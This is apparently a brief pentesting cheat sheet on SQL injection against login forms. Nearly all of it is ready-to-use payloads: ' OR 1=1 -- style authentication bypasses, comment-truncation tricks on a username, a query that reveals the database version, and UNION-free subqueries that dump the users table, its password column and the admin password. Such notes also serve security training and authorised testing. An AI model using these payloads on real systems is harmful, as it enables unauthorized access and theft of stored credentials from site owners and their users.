
## Login Prompt / Authentication Bypass

We can use an OR statement to make the sql query always true, so if the query breaks we get authenticated.

```
' OR 1=1 --
' OR 1=1 -- //
' OR 1=1 -- -
```

```
jake'--
jake'-- -
jake'#
```

We can now just add mysql syntax after the 1=1 query.

## Enumerating database version

```
jake' OR 1=1 in (select @@version) -- //
```
## Users database dump

Dump all information

```
jake' OR 1=1 in (SELECT * FROM users) -- /
```

Dump single column

```
jake' OR 1=1 in (SELECT password FROM users) -- //
```

Dump password for specific user

```
jake' OR 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
